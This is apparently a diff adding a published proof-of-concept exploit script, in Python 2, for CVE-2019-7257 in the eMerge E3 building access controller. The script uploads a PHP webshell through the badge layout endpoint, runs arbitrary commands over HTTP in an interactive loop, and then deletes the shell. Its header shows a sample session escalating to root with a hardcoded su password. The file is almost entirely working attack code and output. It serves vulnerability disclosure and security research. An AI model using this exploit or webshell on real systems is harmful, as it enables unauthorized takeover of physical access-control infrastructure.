@@ -1,0 +1,89 @@
+# Exploit Title: eMerge E3 1.00-06 - Arbitrary File Upload
+# Google Dork: NA
+# Date: 2018-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
+# Software Link: http://linear-solutions.com/nsc_family/e3-series/
+# Version: 1.00-06
+# Tested on: NA
+# CVE : CVE-2019-7257
+# Advisory: https://applied-risk.com/resources/ar-2019-009
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# Advisory: https://applied-risk.com/resources/ar-2019-005
+
+# PoC
+#####################################################################
+#
+# lqwrm@metalgear:~/stuff$ python e3upload.py 192.168.1.2
+# Starting exploit at 17.01.2019 13:04:17
+#
+# lighttpd@192.168.1.2:/spider/web/webroot/badging/bg$ id
+# uid=1003(lighttpd) gid=0(root)
+#
+# lighttpd@192.168.1.2:/spider/web/webroot/badging/bg$ echo davestyle | su -c id
+# Password: 
+# uid=0(root) gid=0(root) groups=0(root)
+#
+# lighttpd@192.168.1.2:/spider/web/webroot/badging/bg$ exit
+#
+# [+] Deleting webshell.php file...
+# [+] Done!
+#
+#####################################################################
+
+import datetime
+import requests
+import sys#####
+import os######
+
+piton = os.path.basename(sys.argv[0])
+
+badge = "/badging/badge_layout_new_v0.php"
+shell = "/badging/bg/webshell.php"
+
+if len(sys.argv) < 2:
+	print "\n\x20\x20[*] Usage: "+piton+" <ipaddress:port>\n"
+	sys.exit()
+
+ipaddr = sys.argv[1]
+vremetodeneska = datetime.datetime.now()
+
+print "Starting exploit at "+vremetodeneska.strftime("%d.%m.%Y %H:%M:%S")
+print
+
+while True:
+    try:
+        target = "http://"+ipaddr+badge
+
+        headers = {"User-Agent": "Brozilla/16.0",
+                   "Accept": "anything",
+                   "Accept-Language": "mk-MK,mk;q=0.7",
+                   "Accept-Encoding": "gzip, deflate",
+                   "Content-Type": "multipart/form-data; boundary=----j",
+                   "Connection": "close"}
+
+        payload = ("------j\r\nContent-Disposition: form-da"
+                   "ta; name=\"layout_name\"\r\n\r\nwebshel"
+                   "l.php\r\n------j\r\nContent-Disposition"
+                   ": form-data; name=\"bg\"; filename=\"we"
+                   "bshell.php\"\r\nContent-Type: applicati"
+                   "on/octet-stream\r\n\r\n<?\nif($_GET['cm"
+                   "d']) {\n  system($_GET['cmd']);\n  }\n?"
+                   ">\n\r\n------j--\r\n")
+
+        requests.post(target, headers=headers, data=payload)
+
+        cmd = raw_input("lighttpd@"+ipaddr+":/spider/web/webroot/badging/bg$ ")
+        execute = requests.get("http://"+ipaddr+shell+"?cmd="+cmd)
+        print execute.text
+        if cmd.strip() == "exit":
+            print "[+] Deleting webshell.php file..."
+            requests.get("http://"+ipaddr+shell+"?cmd=rm%20webshell.php")
+            print "[+] Done!\n"
+            break
+        else: continue
+    except Exception:
+        print "Error!"
+        break
+
+sys.exit()
